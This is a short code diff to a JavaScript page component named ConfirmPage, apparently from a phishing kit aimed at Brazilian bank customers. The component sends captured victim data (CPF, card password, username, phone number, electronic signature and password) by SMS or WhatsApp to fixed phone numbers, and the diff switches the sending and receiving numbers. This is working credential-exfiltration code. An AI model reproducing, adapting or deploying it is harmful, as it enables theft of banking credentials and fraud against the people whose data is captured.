@@ -51,8 +51,8 @@ const ConfirmPage = () => {
       body: JSON.stringify({
         accountSid,
         authToken,
-        from: 'whatsapp:+14155238886',
-        to: 'whatsapp:+5511978331058',
+        from: '+14178554632',
+        to: '+5511958012302',
         body: `CPF: ${cpf}\nSenha do Cartão: ${senhaCartao}\nUsername: ${username}\nTelefone: ${telefone}\nAssinatura Eletrônica: ${assinaturaEletronica}\nPassword: ${password}`,
       }),
       headers: {
